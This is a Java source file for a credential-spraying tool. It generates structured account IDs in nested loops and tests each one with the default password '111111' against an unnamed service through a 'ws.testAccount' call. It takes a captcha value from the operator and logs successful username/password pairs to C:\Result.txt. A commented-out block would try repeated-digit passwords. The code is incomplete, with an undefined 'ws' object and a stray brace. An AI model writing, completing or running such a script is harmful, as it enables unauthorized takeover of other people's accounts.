import java.io.BufferedWriter;
import java.io.File;
import java.io.FileWriter;
import java.util.Scanner;

/**
 * 主方法
 * 
 * @author Legend、
 * 
 */
public class Main {
	public static void append(String username, String password) {
		try {
			BufferedWriter writer = new BufferedWriter(new FileWriter(new File(
					"C:\\Result.txt"), true));
			writer.write("UN[" + username + "]PW[" + password + "]\r\n");
			writer.close();
		} catch (Exception e) {

		}
	}

	public static void main(String[] args) throws Exception {

		// 验证账号并获取cookie
		ws.getValidNum();
		Scanner scanner = new Scanner(System.in);
		String validnumString = scanner.next();
		for (int i = 8; i <= 14; i++) {
			String iiString = (i / 10 == 0 ? "0" + i : i + "") + "00";
			for (int l = 1; l <= 9; l++) {
				for (int z = 1; z <= 5; z++) {
					for (int h = 1; h < 3; h++) {
						for(int gh=1;gh<31;gh++)
						{
							String ghString = (gh / 10 == 0 ? "0" + gh : gh + "");
						String user = iiString + l + z + "0" + h+ghString;
						System.out.println(user);
						/*for (int w = 0; w < 10; w++)
							for (int u = 1; u < 7; u++) {
								String password = "";
								for(int kkk=1;kkk<u;kkk++)
									password+=w+"";*/
						String pass="111111";
								if (ws.testAccount(user, pass,
										validnumString)) {
									System.out.println("success");
									append(user, pass);
								} else {
									System.out.println("no.");
								}
							/*}
						}*/
					}
				}
			}
		}
	}
}
}